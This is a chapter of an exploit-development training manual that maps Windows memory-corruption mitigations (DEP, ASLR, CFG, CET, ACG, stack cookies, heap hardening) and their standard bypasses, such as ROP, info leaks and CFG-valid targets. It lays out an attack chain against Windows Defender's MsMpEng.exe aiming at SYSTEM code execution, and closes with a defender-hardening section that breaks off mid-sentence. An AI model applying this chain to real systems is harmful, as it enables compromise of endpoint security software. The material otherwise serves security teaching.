# Chapter 04 — Mitigations: The Walls They Built

**VADER-RCE Field Manual**
**Prerequisite**: Ch01-03
**Drill**: DRILLS/03_info_leak/, DRILLS/04_rop_chain/

---

## Why You Need This

Chapters 01-03 taught you how to corrupt memory. Overflow a buffer,
hijack a vtable, ride a UAF into code execution. Clean kills — in a
world with no defences.

That world doesn't exist. Windows has been layering mitigations on top
of mitigations for twenty years. Every primitive you learned has a wall
built specifically to stop it. DEP says you can't execute your shellcode.
ASLR says you can't find your target. CFG says you can't call the wrong
function. CET says you can't corrupt return addresses. Stack cookies
say you can't smash the stack silently.

The 0x1security doctrine: **see the paths, see the BLOCKS, find a
substitute way.** This chapter maps every block. Chapters 05-07 give
you the tools to go around them. You cannot bypass what you don't
understand. So understand it.

You already know what mitigations feel like. In vader-toctou, the
"mitigations" were FILE_OBJECT binding, content re-verification,
the identity gate. Microsoft built walls around their scan pipeline
and you had to map every one before you could attack. Same principle,
different domain. Memory corruption mitigations are the identity gates
of the CPU.

---

## WINDOWS SETUP

Every tool mentioned in this chapter. Install them all before you touch
the drills. Do it once, do it right.

### Tools Required

| Tool | Purpose | Where to Get It |
|------|---------|----------------|
| **rp++** | ROP gadget finder — scans PE binaries for gadget sequences | https://github.com/0vercl0k/rp/releases — download `rp-win-x64.exe` |
| **ROPgadget** | Python-based ROP gadget finder — alternative to rp++, supports scripting | `pip install ROPgadget` |
| **CFF Explorer** | PE file inspector — reads DLL headers, characteristics, mitigation flags | https://ntcore.com/?page_id=388 — download NTCore Explorer Suite |
| **PE-bear** | PE editor/viewer — alternative to CFF Explorer, reads DYNAMICBASE/HIGHENTROPYVA | https://github.com/hasherezade/pe-bear/releases |
| **Python 3** | Required for ROPgadget and drill scripts | Already installed — verify below |
| **pwntools** | Python exploit framework — used in drill scripts for crafting payloads | `pip install pwntools` |
| **mingw-gcc** | Windows GCC compiler — compiles the C drill programs | https://winlibs.com/ — download the latest GCC release (UCRT, 64-bit) |
| **Visual Studio Build Tools** | Alternative C compiler — MSVC for Windows-native builds | https://aka.ms/vs/17/release/vs_BuildTools.exe |
| **Process Explorer** | Sysinternals — shows per-process mitigation policies visually | https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer |
| **WinDbg** | Microsoft debugger — essential for hands-on mitigation testing | `winget install Microsoft.WinDbg` (or via Windows SDK) |

### Tools That Require WSL2

**ROPgadget** and **pwntools** run natively on Windows under Python 3.
No WSL required for this chapter. WSL2 becomes mandatory in Chapter 06
when you start working with ELF binaries and Linux-targeted shellcode.

To install WSL2 when you get there:
```powershell
# Run in PowerShell as Administrator
wsl --install
```

### Install Commands (Windows — Run These Now)

```powershell
# Verify Python is present
python --version
# Expected: Python 3.x.x

# Install ROPgadget
pip install ROPgadget

# Install pwntools (Python exploit framework used in drills)
pip install pwntools

# Install WinDbg via winget
winget install Microsoft.WinDbg

# Install mingw-gcc via winget (if not using MSVC)
winget install mingw.mingw-w64
```

### Install rp++ Manually

rp++ has no pip package. Download the binary directly:

1. Go to https://github.com/0vercl0k/rp/releases
2. Download `rp-win-x64.exe`
3. Rename it to `rp.exe` and drop it somewhere on your PATH
   (e.g., `C:\Windows\System32\` or a custom tools folder you've added to PATH)

### Verification Commands

```powershell
# Verify rp++ is installed and on PATH
rp --version
# Expected: rp++ vX.X (XXXX-XX-XX)

# Verify ROPgadget
ROPgadget --version
# Expected: ROPgadget vX.X

# Verify pwntools (must be in Python)
python -c "import pwn; print(pwn.__version__)"
# Expected: X.X.X

# Verify WinDbg is accessible
where windbg
# Expected: C:\Program Files\WindowsApps\Microsoft.WinDbg_...\windbg.exe

# Verify mingw gcc
gcc --version
# Expected: gcc (MinGW...) X.X.X

# Verify CFF Explorer (manual check — no CLI)
# Just open it and drag a DLL onto it — if it shows headers, it works
```

### Admin Rights Warning

**Get-ProcessMitigation** and **Process Explorer** require ADMIN to
inspect system processes like MsMpEng.exe. Right-click PowerShell →
"Run as Administrator" before running the mitigation check commands
in this chapter.

---

## DEP (Data Execution Prevention) / NX Bit

### What It Prevents

Before DEP, exploitation was embarrassingly simple. Overflow a buffer,
drop your shellcode into the buffer, jump to the buffer, done. The
CPU didn't care that the memory was "data" — it executed whatever was
at the instruction pointer.

DEP marks memory pages as either WRITABLE or EXECUTABLE, never both.
Stack pages: writable, not executable. Heap pages: writable, not
executable. Code pages (.text section): executable, not writable.

```
WITHOUT DEP:
┌─────────┐
│  Stack   │  RW + EXECUTE ← shellcode runs here
├─────────┤
│  Heap    │  RW + EXECUTE ← shellcode runs here too
├─────────┤
│  .text   │  R  + EXECUTE
└─────────┘

WITH DEP (NX bit):
┌─────────┐
│  Stack   │  RW + NX  ← write shellcode here, try to execute → ACCESS VIOLATION
├─────────┤
│  Heap    │  RW + NX  ← same, CPU refuses to execute
├─────────┤
│  .text   │  R  + X   ← can execute, but can't write to it
└─────────┘
```

### How It Works

The NX (No-eXecute) bit lives in the page table entry for each memory
page. The CPU checks this bit on every instruction fetch. If the page
is marked NX and the CPU tries to fetch an instruction from it —
hardware exception. STATUS_ACCESS_VIOLATION. Process dies or SEH fires.

This is HARDWARE ENFORCED. Not a software check that can be patched
around. The CPU itself refuses to execute from NX pages.

On AMD: the NX bit (bit 63 of the PTE).
On Intel: the XD bit (eXecute Disable). Same thing, different name.

### The Bypass: ROP (Return-Oriented Programming)

DEP says: you can't execute data you write.
ROP says: fine, I'll reuse code that's ALREADY executable.

The .text section of every loaded DLL is marked executable. That code
is full of useful instruction sequences ("gadgets") that end in `ret`.
Chain them together by overwriting the stack with a sequence of return
addresses. Each `ret` pops the next gadget address, jumps to it,
executes a few instructions, hits another `ret`, pops the next one.

```
STACK (corrupted by overflow):
┌──────────────┐
│ gadget_1 addr│ → pop rdi; ret      (loads arg into rdi)
├──────────────┤
│ arg value    │ → value for rdi
├──────────────┤
│ gadget_2 addr│ → pop rsi; ret      (loads arg into rsi)
├──────────────┤
│ arg value    │ → value for rsi
├──────────────┤
│ VirtualProtect│ → changes NX page to RWX, then jump to shellcode
└──────────────┘
```

You never execute from a writable page. Every instruction the CPU
runs comes from legitimate, mapped, executable code. You're just
running it in an order the developer never intended.

Chapter 07 goes deep on ROP chain construction. For now: **DEP
doesn't stop code execution. It stops DIRECT shellcode injection.
The bypass is code reuse.**

### MsMpEng.exe DEP Status

**DEP is ON.** MsMpEng.exe runs with permanent DEP. Every system
process does on modern Windows. This is non-negotiable — any exploit
against mpengine.dll must account for DEP. Direct shellcode injection
is off the table. ROP or bust.

---

## ASLR (Address Space Layout Randomization)

### What It Randomizes

Without ASLR, every DLL loads at the same base address every time.
`ntdll.dll` always at `0x7FFE0000`. `kernel32.dll` always at
`0x76A00000`. Your ROP gadgets always at the same addresses. Write
the exploit once, works everywhere.

ASLR randomizes the base address of EVERYTHING at load time:

| Component | What's Randomized | When |
|-----------|-------------------|------|
| EXE image base | Base address of the main executable | Process creation |
| DLL image bases | Base address of every loaded DLL | DLL load (per-boot on system DLLs) |
| Heap base | Starting address of the default heap | Process creation |
| Stack base | Starting address of each thread's stack | Thread creation |
| PEB/TEB | Process/Thread Environment Block locations | Process/thread creation |

### Entropy Levels

Not all randomization is equal. Windows ASLR entropy varies:

```
Component             Bits of entropy    Possible positions
─────────────────────────────────────────────────────────
32-bit EXE image      8 bits             256 positions
32-bit DLL image      8 bits             256 positions
32-bit Stack          14 bits            16,384 positions
32-bit Heap           5 bits             32 positions

64-bit EXE image      17 bits            131,072 positions
64-bit DLL (/HIGHENTROPYVA)  19 bits     524,288 positions
64-bit DLL (standard) 14 bits            16,384 positions
64-bit Stack          17 bits            131,072 positions
64-bit Heap           17 bits            131,072 positions
```

8 bits = 256 possibilities = bruteforceable if you get 256 attempts.
19 bits = 524,288 possibilities = not bruteforceable. You need a leak.

### High Entropy ASLR (/HIGHENTROPYVA)

64-bit binaries compiled with `/HIGHENTROPYVA` get the full 19-bit
randomization for image base. Without the flag, they only get 14 bits.
Most modern Microsoft binaries ship with this flag. mpengine.dll
included.

Check it yourself:
```powershell
# dumpbin is part of Visual Studio Build Tools — run in Developer Command Prompt
dumpbin /headers mpengine.dll | findstr "high entropy"
# Expected output if flag is set:
#                   HIGH ENTROPY VA
```

#### Expected Output

**Success** — flag is set:
```
                HIGH ENTROPY VA
```

**Failure looks like "no output returned"** — means the flag is NOT set
in this binary. That DLL only has 14-bit randomization. Note it —
that's a weaker ASLR target.

**Failure looks like "'dumpbin' is not recognized"** — means you're
not in a Visual Studio Developer Command Prompt. Open Start → search
"Developer Command Prompt for VS 2022" and run it from there. Or use
CFF Explorer (GUI) instead.

Or in CFF Explorer / PE-bear: look for IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA
in the DLL characteristics field.

### How to Use CFF Explorer to Check HIGHENTROPYVA

CFF Explorer is a GUI tool for reading PE file headers. Here's exactly
what to do — there's no command line for it:

1. Open CFF Explorer (the `.exe` you downloaded from ntcore.com)
2. File → Open → navigate to the DLL you want to inspect
   (e.g., `C:\Program Files\Windows Defender\mpengine.dll`)
3. In the left panel, click **NT Headers → Optional Header**
4. Look at the **DLL Characteristics** field
5. Click the `...` button next to it to expand the flags
6. Check if **IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA** is ticked

If it's ticked: 19-bit ASLR. You need an info leak to beat it.
If it's not ticked: 14-bit ASLR. Still random but weaker.

Also check **IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE** — if this flag
is NOT set, the DLL loads at a fixed address every time. That's a
free ASLR bypass for any gadgets in it.

### The Bypass: Information Leak

ASLR doesn't protect you if the attacker can READ memory. Any bug
that leaks a pointer back to the attacker defeats ASLR:

```
1. Trigger a bug that leaks a pointer value
   (e.g., uninitialized memory read, out-of-bounds read, UAF where
    the freed memory contains a pointer that gets sent back)

2. Leaked pointer: 0x00007FFABC123456
   Known offset of that pointer within its DLL: 0x123456
   DLL base = 0x00007FFABC123456 - 0x123456 = 0x00007FFABC000000

3. Now you know where every function and gadget in that DLL lives.
   ASLR defeated. Calculate all your ROP addresses from the base.
```

This is why the doctrine says **crash → LEAK MEMORY → execute.**
The leak is not optional. Without it, you're gambling on 19 bits
of entropy. With it, ASLR is a solved problem.

### Force-Loading Non-ASLR Modules

Rare but real: if you can force a process to load a DLL compiled
without `/DYNAMICBASE`, that DLL loads at its preferred base address
every time. Its addresses are static. Instant ASLR bypass for any
gadgets in that DLL.

On modern Windows this is almost nonexistent for system DLLs. But
third-party DLLs, old COM objects, or plugin modules? Sometimes.
Worth checking what mpengine.dll loads — any module without
DYNAMICBASE is a free gadget source.

---

## CFG (Control Flow Guard)

### What It Protects

DEP stops you from executing shellcode. ASLR stops you from finding
gadgets. But what if you can calculate addresses AND chain gadgets?
You still need to CALL those gadgets. Overwrite a function pointer
→ indirect call → your target.

CFG validates every indirect call at runtime. Before executing
`call [rax]`, the program checks: is the target address a valid
function entry point?

```c
// Without CFG:
void (*callback)(int) = table[index];
callback(arg);
// Compiles to:
//   mov rax, [table + index*8]
//   call rax                      ← calls ANYTHING

// With CFG:
void (*callback)(int) = table[index];
_guard_check_icall(callback);       // ← VALIDATION INSERTED BY COMPILER
callback(arg);
// If callback doesn't point to a valid function start → process killed
```

### The CFG Bitmap

CFG maintains a bitmap covering the entire virtual address space.
Each bit represents an 8-byte-aligned address. If a bit is set,
that address is a valid indirect call target (a function entry point).

```
CFG Bitmap:
Address range:  0x00000000  0x00000008  0x00000010  0x00000018 ...
Bit value:          1           0           1           0
                    ↑                       ↑
               valid target            valid target
               (function start)        (function start)

_guard_check_icall(addr):
1. Calculate bitmap index: addr >> 3
2. Check bit at that index
3. If bit == 0 → INT 29 (fast fail) → process terminated
4. If bit == 1 → proceed with call
```

The bitmap is populated at load time by the loader. Every exported
function, every function whose address is taken — their entry points
get marked valid.

### What CFG Does NOT Protect

CFG only checks INDIRECT CALLS. It does not protect:

**Return addresses**: `ret` pops an address off the stack and jumps
to it. CFG doesn't validate return targets. That's CET's job (next
section).

**Direct calls/jumps**: `call 0x12345678` (hardcoded address in code)
is not checked. The compiler generated it — it's trusted.

**Data-only attacks**: If you corrupt a SIZE field or an INDEX rather
than a function pointer, CFG doesn't help. You're not doing an indirect
call — you're making the program allocate the wrong size or access
the wrong array element. No control flow change = CFG irrelevant.

**The arguments to a valid call**: CFG checks that `callback` points
to a real function. It does NOT check that you're calling the RIGHT
function with the RIGHT arguments. Any valid function is fair game.

### CFG Bypasses

**1. Calling valid-but-wrong functions**:
```
Legitimate target: process_data(buffer)
You overwrite the function pointer to point to: system("cmd.exe")
Both are valid functions. Both are in the bitmap. CFG approves.
```

More realistically: you target `VirtualProtect` (a valid function)
to mark a page as RWX, then jump to your shellcode. CFG says
VirtualProtect is a valid call target. It doesn't know you're
calling it to disable DEP.

**2. JIT-compiled code regions**: Just-In-Time compilers (JavaScript
engines, .NET JIT) generate code at runtime. JIT code gets marked
executable but might not have proper CFG metadata. If MsMpEng loads
anything with a JIT component, those regions are potential targets.

**3. Non-CFG modules**: If any loaded DLL was compiled without CFG,
calls through that DLL's function pointers are unchecked. The check
is per-module. One weak link breaks the chain.

### XFG (eXtended Flow Guard)

Microsoft's next generation. XFG doesn't just check "is this a valid
function?" — it checks "is this a valid function FOR THIS CALL SITE?"

Each indirect call site gets a type hash based on the function
signature (return type, parameter types, calling convention). The
target function must match that hash. You can't substitute
`VirtualProtect` for `process_data` if they have different signatures.

XFG is deployed in some Windows components but not universally.
Worth checking if mpengine.dll uses XFG or just CFG.

---

## CET (Control-flow Enforcement Technology)

### Shadow Stack

CFG protects forward-edge control flow (indirect calls). CET
protects backward-edge control flow (returns).

The shadow stack is a second, hardware-protected stack that stores
ONLY return addresses. When a `call` instruction executes:
- Normal stack: pushes return address (writable, corruptible)
- Shadow stack: pushes return address (hardware-protected, read-only to user code)

When `ret` executes:
- Pops return address from normal stack
- Pops return address from shadow stack
- Compares them
- If they don't match → #CP exception → process killed

```
NORMAL STACK        SHADOW STACK
┌────────────┐      ┌────────────┐
│ ret addr   │ ←──→ │ ret addr   │  ← must match
│ (writable) │      │ (protected)│
├────────────┤      ├────────────┤
│ local vars │      │ ret addr   │  ← previous frame
├────────────┤      ├────────────┤
│ ret addr   │ ←──→ │ ret addr   │  ← must match
└────────────┘      └────────────┘

Attacker overwrites normal stack ret addr:
Normal stack: 0xDEADBEEF  (attacker's address)
Shadow stack: 0x00401234  (real return address)
→ MISMATCH → #CP → process dies
```

This kills ROP. Every gadget ends with `ret`. Every `ret` now gets
validated against the shadow stack. You can't corrupt the shadow
stack from user mode — it's in supervisor-protected memory pages
marked with a special page table attribute.

### IBT (Indirect Branch Tracking)

IBT is the forward-edge equivalent. Every indirect branch (`jmp [reg]`
or `call [reg]`) must land on an `ENDBRANCH` instruction. If it
doesn't → #CP exception.

The compiler inserts `ENDBRANCH` (Intel: `endbr64`) at every valid
indirect branch target. It's a NOP on CPUs without CET support. On
CET-enabled CPUs, the branch tracking state machine checks for it.

```nasm
; Valid target — has ENDBRANCH
my_function:
    endbr64                ; ← CET checks for this on indirect jumps/calls
    push rbp               ; ← normal function prologue
    mov rbp, rsp           ; ← set up stack frame
    ...

; If you redirect an indirect call to the middle of a function:
my_function+0x10:
    mov rax, [rcx]         ; ← no ENDBRANCH here — CET will reject this target
    ...
; → #CP exception, process dies
```

IBT + shadow stack together = you can't redirect forward edges OR
backward edges. In theory, exploitation becomes extremely difficult.

### Current Deployment Status

CET requires:
1. **CPU support**: Intel 11th gen (Tiger Lake) or newer. AMD Zen 3+.
2. **OS support**: Windows 11 21H2+ has kernel support.
3. **Binary opt-in**: The EXE must be compiled with `/CETCOMPAT`.

**Reality check**: CET is rolling out slowly. Not all system processes
have it enabled. Not all hardware supports it. George — check your
own CPU. If you're on an older chip, CET is irrelevant for YOUR
testing. But it's the future, and any exploit technique that survives
CET is more valuable than one that doesn't.

Shadow stack (return protection) is more widely deployed than IBT.
Microsoft calls their implementation "Hardware-enforced Stack Protection"
in Process Explorer.

---

## ACG (Arbitrary Code Guard)

### What It Prevents

ACG is a process mitigation policy that forbids dynamic code
generation. Specifically:

1. **No RWX pages**: `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` fails.
2. **No W→X transitions**: `VirtualProtect` cannot make a writable
   page executable, or an executable page writable.
3. **No new executable pages from data**: `VirtualAlloc` with
   `PAGE_EXECUTE_READ` on anonymous (non-image) memory fails.

```
Without ACG:
  VirtualAlloc(RWX) → write shellcode → jump to it   ← works

With ACG:
  VirtualAlloc(RWX) → ERROR, denied
  VirtualAlloc(RW)  → write shellcode → VirtualProtect(RX) → ERROR, denied
  There is NO path from attacker-written data to executable memory
```

### Why It Matters For Exploitation

A common ROP chain endgame is:
1. ROP to `VirtualProtect` → mark shellcode page as RWX
2. Return to shellcode on the now-executable page

ACG blocks step 1. `VirtualProtect` refuses to add execute permission
to a data page. Your ROP chain can do everything EXCEPT create
executable memory for shellcode.

With ACG, your entire exploit must be ROP-only. No shellcode stage.
Every operation must be chained from existing code gadgets. This is
significantly harder but not impossible — "data-only attacks" and
pure-ROP payloads exist.

### Deployment Status

ACG is used by:
- Microsoft Edge (Chromium) renderer processes
- Some Windows system services
- Windows Defender Application Guard

**MsMpEng.exe**: Not confirmed to have ACG enabled. Verify with:
```powershell
# Run PowerShell as Administrator
Get-ProcessMitigation -Name MsMpEng.exe
# Look for: DynamicCode → ProhibitDynamicCode : ON (or OFF)
```

#### Expected Output

**Success — ACG is OFF on MsMpEng:**
```
ProcessName: MsMpEng
...
DynamicCode:
  ProhibitDynamicCode          : OFF
```
This means the VirtualProtect → RWX → shellcode path is viable (after
you've defeated DEP via ROP and ASLR via info leak).

**Success — ACG is ON on MsMpEng:**
```
DynamicCode:
  ProhibitDynamicCode          : ON
```
This means you need a fully ROP-based payload. No shellcode stage at all.

**Failure looks like "Access is denied"** — means you're not running
PowerShell as Administrator. Close it and reopen with "Run as Administrator".

If ACG is NOT on MsMpEng, the VirtualProtect → RWX → shellcode path
remains viable after you defeat DEP (via ROP to VirtualProtect) and
ASLR (via info leak). If ACG IS on, you need a fully ROP-based payload.

---

## Stack Cookies (/GS)

### How The Canary Works

The `/GS` compiler flag inserts a random value (the "stack cookie"
or "canary") between local variables and the saved return address:

```
STACK (with /GS):
┌─────────────────┐ LOW ADDRESS
│ local vars      │  ← buffer overflow starts here
├─────────────────┤
│ STACK COOKIE    │  ← random value, checked before return
├─────────────────┤
│ saved RBP       │
├─────────────────┤
│ return address  │  ← target of overflow
└─────────────────┘ HIGH ADDRESS
```

Before the function returns, the compiler inserts a check:
```c
// Compiler-generated epilogue — you do NOT write this, the compiler adds it:
if (stack_cookie != __security_cookie ^ frame_pointer) {
    // Cookie is corrupted → someone smashed the stack
    __report_gsfailure();  // calls TerminateProcess → dead
}
ret;  // only reached if cookie is intact
```

To overwrite the return address, you MUST overwrite the cookie first
(it's between your buffer and the return address). But you don't know
the cookie value — it's randomized per-process at startup.

### Why It's Mostly Solved (For Stack Overflows)

Stack cookies make LINEAR stack buffer overflows non-exploitable in
most cases. You can't skip over the cookie to hit the return address
without corrupting it.

But /GS does NOT protect against:
- **Heap overflows**: No cookies on heap allocations. Different mitigation domain.
- **Write-what-where primitives**: If you can write to an arbitrary
  address (not a linear overflow), you skip the cookie entirely.
- **Info leaks**: Leak the cookie value → include the correct cookie
  in your overflow payload. Unlikely but theoretically possible.
- **Exception handler overwrites**: On 32-bit, the SEH chain lives
  on the stack BELOW the cookie. Overwrite the exception handler
  instead of the return address. (SafeSEH / SEHOP mitigate this.)

### SafeSEH and SEHOP

**SafeSEH**: Compiled-in table of valid exception handler addresses.
Before dispatching an exception, the system checks: is the handler
in the table? If not → refuse to call it. 32-bit only.

**SEHOP** (Structured Exception Handling Overwrite Protection):
Validates the SEH chain integrity by checking that the chain ends
at a known sentinel. If the chain is corrupted, the exception
dispatcher refuses to walk it. System-wide on Windows 10+.

On 64-bit Windows: SEH is table-based (not stack-based), so the
classic SEH overwrite attack doesn't apply. One less thing to worry
about for mpengine.dll exploitation (MsMpEng is 64-bit).

---

## Heap Hardening

### LFH Randomization

The Low Fragmentation Heap randomizes allocation order within buckets.
When you request 32 bytes five times in a row, the five chunks are
NOT necessarily adjacent or in order. The allocator scatters them
across the bucket's pages.

This makes heap grooming (arranging objects in predictable positions
for an overflow) harder. In Chapters 01-03, those clean diagrams
with "YOUR BUFFER | NEXT OBJECT" assumed predictable layout. LFH
says: fuck your diagram, the objects could be anywhere in the bucket.

**Not unbeatable**: LFH randomization has finite entropy. If you
allocate ENOUGH objects, you fill the randomized slots and new
allocations become more predictable. Heap spraying (filling memory
with thousands of identical objects) is partly a response to LFH
randomization — if every adjacent slot contains your data, it
doesn't matter which one gets hit.

### Segment Heap Metadata Separation

Classic NT Heap stored metadata (chunk headers with size, flags,
flink/blink) INLINE with user data. Overflow the data → corrupt
the metadata → heap metadata attack → arbitrary write.

The Segment Heap moves metadata to separate pages:

```
NT HEAP (inline metadata):
┌──────────┬──────────┬──────────┬──────────┐
│ HDR      │ USER DATA│ HDR      │ USER DATA│
│ (corrupt │ (your    │ (gets    │          │
│  this)   │  buffer) │  hit)    │          │
└──────────┴──────────┴──────────┴──────────┘

SEGMENT HEAP (separated metadata):
Metadata pages:  ┌──────────┬──────────┐
                 │ HDR info │ HDR info │
                 └──────────┴──────────┘

Data pages:      ┌──────────┬──────────┐
                 │ USER DATA│ USER DATA│
                 │ (overflow│ (hits    │
                 │  this)   │  THIS,   │
                 │          │  not HDR)│
                 └──────────┴──────────┘
```

You can still corrupt adjacent user data objects (UAF, type confusion,
vtable hijack). You just can't easily corrupt the ALLOCATOR ITSELF
via inline metadata. The unlink attacks from Chapter 03 are dead
against Segment Heap. Adapt.

### Heap Guard Pages

Windows places guard pages (PAGE_NOACCESS) at certain boundaries
in the heap. If an overflow crosses a guard page → immediate access
violation. This catches large overflows but small, precise overflows
that stay within a single page won't trigger the guard.

### Safe Unlinking

Both NT Heap and Segment Heap validate doubly-linked list pointers
before unlinking a chunk:

```c
// Safe unlink check — allocator runs this automatically before every free():
if (chunk->flink->blink != chunk || chunk->blink->flink != chunk) {
    // Pointer consistency check failed — list is corrupted
    RtlReportCriticalFailure();  // crash the process
}
```

The classic heap exploit (corrupt flink/blink → arbitrary write on
unlink) is dead on any modern Windows heap. The allocator verifies
pointer consistency before every list operation. You need different
primitives — corrupt the DATA inside objects, not the heap metadata.

---

## The Mitigation Map For MsMpEng.exe

This is what you're up against. MsMpEng.exe is a SYSTEM process
running Windows Defender's engine. Here's what's enforced:

### How To Check

```powershell
# PowerShell — requires admin
Get-ProcessMitigation -Name MsMpEng.exe

# Or in Process Explorer:
# Right-click MsMpEng.exe → Properties → Mitigation Policies tab
```

#### Expected Output

**Success:**
```
ProcessName: MsMpEng

DEP:
  Enable                       : ON
  EmulateAtlThunks             : OFF

ASLR:
  EnableBottomUpRandomization  : ON
  EnableHighEntropy             : ON
  EnableForceRelocateImages    : ON
  DisallowStrippedImages       : OFF

CFG:
  Enable                       : ON
  SuppressExports              : OFF
  StrictMode                   : OFF
...
```

Your job: read every ON/OFF and map it to the table below.

**Failure looks like "Access is denied"** — not running as admin.
Close PowerShell, right-click → "Run as Administrator", try again.

**Failure looks like "Cannot find a process with the name MsMpEng.exe"** —
Defender isn't running or the process has a different name on your build.
Open Task Manager first to confirm the exact process name.

You can also enumerate programmatically:
```c
// GetProcessMitigationPolicy() — call once per mitigation type
// hProcess must be opened with PROCESS_QUERY_INFORMATION access
GetProcessMitigationPolicy(hProcess, ProcessDEPPolicy, &dep, sizeof(dep));
GetProcessMitigationPolicy(hProcess, ProcessASLRPolicy, &aslr, sizeof(aslr));
GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy, &cfg, sizeof(cfg));
// ... etc — one call per PROCESS_MITIGATION_POLICY enum value
```

### What's ON (Confirmed Or Near-Certain)

| Mitigation | Status | Implication |
|------------|--------|-------------|
| **DEP** | ON (permanent) | No shellcode on stack/heap. Must use ROP. |
| **ASLR** | ON (high entropy) | All addresses randomized with 17-19 bits entropy. Need info leak. |
| **CFG** | ON | Indirect calls validated against bitmap. Must target valid functions. |
| **/GS (Stack cookies)** | ON (compile-time) | Linear stack overflows detected. Heap is the primary target. |
| **Heap hardening** | ON (Segment Heap + LFH) | No inline metadata corruption. Must target adjacent object data. |
| **SafeSEH/SEHOP** | ON (but irrelevant — 64-bit) | SEH exploits don't apply to 64-bit processes. |

### What MIGHT NOT Be On

| Mitigation | Status | Implication |
|------------|--------|-------------|
| **CET / Shadow Stack** | Depends on hardware | If your CPU supports CET AND Windows has it enabled for MsMpEng, ROP is dead. If not, ROP still works. CHECK YOUR HARDWARE. |
| **ACG** | Not confirmed for MsMpEng | If off → VirtualProtect RWX path works. If on → pure ROP only, no shellcode stage. VERIFY THIS. |

### The Exploitation Equation

Given what's enforced, here's the minimum chain to get code execution
on MsMpEng.exe:

```
1. CRASH (fuzzer finds heap corruption bug in mpengine.dll)
       ↓
2. INFO LEAK (convert crash to pointer leak → defeat ASLR)
       ↓
   Now you know where every DLL, gadget, and function lives.
       ↓
3. ROP CHAIN (chain existing code gadgets → defeat DEP)
       ↓
   Build a ROP payload from calculated addresses.
   If ACG is off: ROP to VirtualProtect → mark page RWX → shellcode
   If ACG is on:  entire payload must be ROP gadgets
       ↓
4. VALID FUNCTION TARGET (indirect call must pass CFG check)
       ↓
   Overwrite function pointer with address of a valid function
   that serves as your ROP pivot (e.g., longjmp, stack pivot gadget
   at a function entry point)
       ↓
5. CODE EXECUTION AS SYSTEM
```

Missing ANY step and the exploit fails:
- No info leak → ASLR blocks you (addresses wrong)
- No ROP → DEP blocks you (shellcode can't execute)
- No valid target → CFG kills the process before your gadgets run
- If CET is on → shadow stack blocks ROP returns (need alternative)

---

## Mapping To The Doctrine

The 0x1security compass says: **see the paths, see the blocks,
find a substitute way.**

This chapter IS the block map. Every mitigation is a wall. Every
wall has a documented bypass. The bypass IS the substitute way.

| Block | Substitute Way | Chapter |
|-------|---------------|---------|
| DEP blocks shellcode execution | ROP — reuse existing executable code | Ch07 |
| ASLR hides addresses | Info leak — read a pointer, calculate base | Ch05-06 |
| CFG blocks wrong function calls | Target valid-but-useful functions (VirtualProtect, longjmp) | Ch07 |
| CET blocks ROP returns | Data-only attacks, JOP (Jump-Oriented Programming), or accept CET-off targets | Ch07 |
| ACG blocks RWX pages | Pure-ROP payload (no shellcode stage) | Ch07 |
| /GS blocks stack overflow | Target the heap instead (Chapters 01-03 are all heap) | Ch01-03 |
| Heap hardening blocks metadata attacks | Target adjacent object DATA, not allocator metadata | Ch01-03 |

The doctrine also says: **crash → leak memory → execute arbitrary code.**

Map that to mitigations:
- **Crash** = the bug itself (heap overflow, UAF, type confusion)
- **Leak memory** = defeat ASLR (the mandatory first bypass)
- **Execute arbitrary code** = defeat DEP (ROP) + defeat CFG (valid targets)

Three bugs. Three walls. Three bypasses. Each bypass is a skill.
The next chapters teach those skills.

One more thing from the doctrine: **search for knowledge, not 0-days.**
You're not hunting mitigations to defeat them tomorrow. You're mapping
the terrain so that when a crash appears in your fuzzer output, you
already know the path from crash to code execution. The knowledge
comes first. The 0-day is a side effect.

---

## DEFENDER TAKEAWAY

You've just mapped the walls that Windows built. Now flip it: you're
the defender. Here's what these mitigations mean on Monday morning
when you're hardening systems or investigating a suspicious process.

- **Enable DEP system-wide.** Go to System Properties → Advanced →
  Performance Settings → Data Execution Prevention → "Turn on DEP for
  all programs and services except those I select." This forces hardware
  NX on everything. Any legacy app that breaks was relying on executable
  stack/heap — that's a red flag on its own.

- **Enforce ASLR mandatory relocation.** In Windows Security →
  App & browser control → Exploit protection settings → System settings,
  set "Force randomization for images (Mandatory ASLR)" to ON.
  This forces /DYNAMICBASE on ALL binaries, even ones compiled without it.
  Free ASLR upgrade for legacy DLLs that ship without the flag.

- **Check your processes for missing mitigations (Windows Event ID 1: WER).
  Crashes that trigger Windows Error Reporting before a mitigation can log
  are suspicious. Enable WER logging and watch for MsMpEng, lsass, and
  svchost crashes — those are exactly what a failed exploit attempt looks
  like.**

- **Windows Event ID 10: WMI activity and Event ID 4688: Process creation.**
  A successful CFG bypass that pivots to cmd.exe or powershell.exe will
  generate a 4688. Enable process creation auditing: `auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable`. Correlate
  with parent process — cmd.exe spawned from MsMpEng.exe is immediately
  suspicious.

- **Audit non-ASLR DLLs loading into high-value processes.** Use Process
  Explorer: View → Lower pane → DLLs. Sort by "Base" column. Any DLL
  loading at a round, static address (like `0x10000000` exactly) is
  compiled without /DYNAMICBASE. That's a fixed-address gadget source for
  an attacker. Identify it, report it to the vendor, or quarantine the
  software.

- **Deploy Hardware-enforced Stack Protection where available.** If your
  CPUs support CET (Intel 11th gen+, AMD Zen 3+), ensure Windows 11 has
  it enabled for high-value processes. Check in Process Explorer:
  right-click a process → Properties → Mitigation Policies →
  look for "Hardware-enforced Stack Protection." If it shows OFF on
  a system process and your hardware supports it, that's a gap worth
  raising with your security team.

- **Use Get-ProcessMitigation as a regular audit tool.** Run it weekly
  against your crown-jewel processes. If a software update REMOVES a
  mitigation (vendors sometimes do this to fix compatibility), you'll
  catch it. Pipe the output to a log file and diff it against last week.
  ```powershell
  # Save current mitigation state for all processes
  Get-Process | ForEach-Object {
      try { Get-ProcessMitigation -Id $_.Id } catch {}
  } | Out-File "C:\Logs\mitigations_$(Get-Date -Format yyyyMMdd).txt"
  ```

- **Heap spray attempts leave a memory footprint.** If an attacker is
  spraying the heap with thousands of identical allocations to beat LFH
  randomization, memory usage of the target process will spike hard and
  fast before any crash. Monitor with Performance Monitor (perfmon) or
  Task Manager — a sudden jump of hundreds of MB in a process that
  normally sits stable is worth investigating. Correlate with network
